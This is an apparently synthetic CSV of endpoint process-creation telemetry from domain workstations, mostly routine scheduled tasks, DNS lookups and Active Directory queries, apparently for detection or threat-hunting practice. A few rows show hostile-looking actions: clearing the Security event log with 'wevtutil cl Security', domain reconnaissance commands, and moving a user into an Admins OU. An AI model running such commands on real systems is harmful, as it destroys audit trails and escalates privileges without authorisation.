Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,ProcessCommandLine,ProcessId,InitiatingProcessFileName,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessParentFileName,InitiatingProcessSHA1,AccountName,AccountDomain,AccountSid,ReportId
2026-02-13T09:34:15.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c winrm quickconfig,23259,explorer.exe,23500,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,ad376493a1f6cb94eaff99ec324a969a
2026-02-23T12:55:02.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c net time /domain,23757,explorer.exe,23872,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,edaddcb4958919fc0403692941b60503
2026-02-03T08:59:56.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""NightlyReport"" /tr ""C:\Reports\gen.exe"" /sc daily /st 01:00 /f",24115,powershell.exe,24245,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,1d11b0e98b4940a60fe4dcc7164bd510
2026-02-04T12:32:35.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""VPNHealthCheck"" /tr ""C:\VPN\healthcheck.exe"" /sc hourly /f",24254,powershell.exe,24481,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,75fd13832a907d5dbf44d37c14affb13
2026-02-01T09:53:09.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""DBMaintenance"" /tr ""sqlcmd.exe -S localhost -Q DBCC"" /sc weekly /f",24776,powershell.exe,25011,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,ba2b59f17d9253d22982a028e76d13e9
2026-02-14T10:47:14.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""AssetScan"" /tr ""C:\ITAM\scan.exe"" /sc daily /f",25230,powershell.exe,25433,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,f9c78870aab18a405ce0ba52c0142004
2026-02-17T12:25:57.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""LogArchive"" /tr ""C:\Logs\archive.exe"" /sc monthly /f",25482,powershell.exe,25707,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,a73e071f728c89079ec78a952cfd8e57
2026-02-03T12:25:05.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""PSHealthCheck"" /tr ""powershell.exe -File C:\Monitoring\health.ps1"" /sc hourly /f",25732,powershell.exe,25771,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,cb531e9196cd1212413b3a9acad75d66
2026-02-01T12:43:31.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""PSInventory"" /tr ""powershell.exe -c Get-ComputerInfo | Out-File C:\inv.txt"" /sc daily /f",26000,powershell.exe,26121,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,731dfd78d36f6ce037815eaea7a116b8
2026-02-14T09:51:57.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""PSPatchCheck"" /tr ""powershell.exe -File C:\Patch\check.ps1"" /sc weekly /f",26345,powershell.exe,26595,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,3c57aa2fcd35c3bf4d8b16eb1940ab16
2026-02-18T10:02:04.000Z,33c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3,PROD-WS-013,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""PSLogCleanup"" /tr ""powershell.exe -c Remove-Item C:\Logs\*.old"" /sc monthly /f",26656,powershell.exe,26668,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,pweber,PROD,S-1-5-21-9876543210-0987654321-123456789-2003,834757d2479dd4ebec4b525c3f954b30
2026-02-22T12:21:12.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""PSUserReport"" /tr ""powershell.exe -c Get-LocalUser | Export-Csv C:\rpt.csv"" /sc weekly /f",26952,powershell.exe,27019,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,e113865d3c652432a1124899ba2efb0a
2026-02-04T09:14:12.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""PSCertCheck"" /tr ""powershell.exe -File C:\Certs\verify.ps1"" /sc daily /f",27129,powershell.exe,27331,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,f0812bf56053b0f2a055cc74a895fd13
2026-02-12T12:12:44.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,schtasks.exe,C:\Windows\System32\schtasks.exe,c3d4e5f6b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,"schtasks.exe /create /tn ""PSNetScan"" /tr ""powershell.exe -c Test-NetConnection prod.corp.local"" /sc hourly /f",27603,powershell.exe,27827,powershell.exe -File C:\IT\sched.ps1,explorer.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,0b89b8c5a1f7f2487fde97fe61b09113
2026-02-12T10:34:11.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup prod-dc01.prod.corp.local,27906,cmd.exe,28149,cmd.exe /c nslookup prod-dc01.prod.corp.local,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,6ac1d0de97a2f7f5516a647987cfe078
2026-02-24T09:40:13.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup -type=NS prod.corp.local,28381,cmd.exe,28448,cmd.exe /c nslookup -type=NS prod.corp.local,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,942902e42e911ef50e7b5dc860708aea
2026-02-23T10:48:11.000Z,77a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,PROD-LT-013,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup -type=PTR 10.20.1.101,28500,cmd.exe,28505,cmd.exe /c nslookup -type=PTR 10.20.1.101,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,2b6c96cfc2b413ee377814b3d028d376
2026-02-20T08:07:06.000Z,77a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7,PROD-LT-013,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup -type=SOA prod.corp.local,28703,cmd.exe,29002,cmd.exe /c nslookup -type=SOA prod.corp.local,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,skraus,PROD,S-1-5-21-9876543210-0987654321-123456789-2007,fdaabc106a54e2ab5b62f9c261d296a8
2026-02-14T09:41:16.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup appserver.prod.corp.local,29013,cmd.exe,29308,cmd.exe /c nslookup appserver.prod.corp.local,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,a334e2c01c58f7b08c09a9f8fd53ea97
2026-02-24T10:13:06.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,nslookup.exe,C:\Windows\System32\nslookup.exe,b2c3d4e5f6a1c3d4e5f6a1b2c3d4e5f6a1b2c3d4,nslookup -type=TXT prod.corp.local,29586,cmd.exe,29608,cmd.exe /c nslookup -type=TXT prod.corp.local,explorer.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,81da54faec63a8a2ac48cba60caf414b
2026-02-08T11:52:35.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Sync-ADObject -Object CN=fmuller,OU=Users,DC=prod,DC=corp,DC=local""",29843,explorer.exe,29913,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,07a726c07e176226b1e2ca71ab02c976
2026-02-11T12:58:33.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Repair-Volume -DriveLetter C""",30086,explorer.exe,30136,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,0423e1ec7eae2671e99ad9f94b83bd44
2026-02-08T12:39:01.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-DscConfiguration""",30289,explorer.exe,30361,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,f671a2881bec878eae0c0ce76af1f3e0
2026-02-23T08:51:32.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Invoke-DscResource -Name WindowsFeature -Method Test -Property @{Name='RSAT'}""",30418,explorer.exe,30575,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,e9d283fb6a68490c300049efeb2a0cfb
2026-02-11T09:41:03.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c nltest /dclist:prod.corp.local,30614,explorer.exe,30743,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,893dec3b52acf90084d286c40aeed42c
2026-02-24T11:06:40.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c dnscmd /enumzones,31032,explorer.exe,31312,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,be7f7e14e4428cc84843e54d15975db3
2026-02-12T11:01:55.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c netdom query fsmo,31503,explorer.exe,31707,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,f6cce560c418cbff15bc547fda0319fd
2026-02-13T09:23:17.000Z,11a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,PROD-WS-011,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c repadmin /showrepl,31869,explorer.exe,32026,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,fmuller,PROD,S-1-5-21-9876543210-0987654321-123456789-2001,a9e64d9cf19d0796165fa6859a30b000
2026-02-09T11:01:48.000Z,88b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8,PROD-WS-015,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-ADForest""",32204,explorer.exe,32501,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,dfischer,PROD,S-1-5-21-9876543210-0987654321-123456789-2008,693365aae2a935ea67d351eb1f41897a
2026-02-10T10:31:19.000Z,22b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2,PROD-WS-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-ADDomain""",32560,explorer.exe,32770,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,nschneider,PROD,S-1-5-21-9876543210-0987654321-123456789-2002,4f2f99138217e88acc14d81ce86bf06e
2026-02-08T12:08:13.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-ADGroup -Filter * -SearchBase 'OU=Groups,DC=prod,DC=corp,DC=local'""",32851,explorer.exe,33010,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,5538e1f79ad850fac58b053b325cc5bb
2026-02-19T09:44:37.000Z,aad1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0,PROD-LT-014,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Move-ADObject -Identity CN=fmuller -TargetPath OU=Admins""",33240,explorer.exe,33462,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,bharmann,PROD,S-1-5-21-9876543210-0987654321-123456789-2010,4f19c48fcf9efb0e689fe046e2f20761
2026-02-09T08:45:57.000Z,44d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4,PROD-WS-014,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c wevtutil cl Security,33503,explorer.exe,33603,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,hbauer,PROD,S-1-5-21-9876543210-0987654321-123456789-2004,fcaee7c76aa6a557ee9e8ae496db5873
2026-02-10T11:30:39.000Z,99c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9,PROD-WS-016,ProcessCreated,cmd.exe,C:\Windows\System32\cmd.exe,b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3,cmd.exe /c auditpol /get /category:*,33615,explorer.exe,33811,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,uwolf,PROD,S-1-5-21-9876543210-0987654321-123456789-2009,e01e0fb761e1437d28a1cc10bf658732
2026-02-07T12:07:59.000Z,66f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6,PROD-LT-012,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2,"powershell.exe -c ""Get-MsolUser -All""",33878,explorer.exe,34167,explorer.exe,userinit.exe,d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5,gmayer,PROD,S-1-5-21-9876543210-0987654321-123456789-2006,249df7171263f1df77f01318f1b01e50
